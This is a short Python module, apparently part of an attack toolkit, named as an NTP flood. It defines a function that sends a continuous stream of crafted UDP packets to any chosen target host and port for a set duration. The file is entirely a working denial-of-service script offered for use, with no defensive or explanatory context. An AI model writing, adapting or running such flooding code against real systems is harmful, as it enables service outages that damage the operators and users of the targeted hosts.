# attacks/ntpflood.py

import socket
import time
import struct

def attack(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    while time.time() < end_time:
        packet = struct.pack("!12s10I", b'\x00' * 12, int(time.time()), 0, 0, 0, 0, 0, 0, 0, 0, 0)
        sock.sendto(packet, (target, port))

    sock.close()
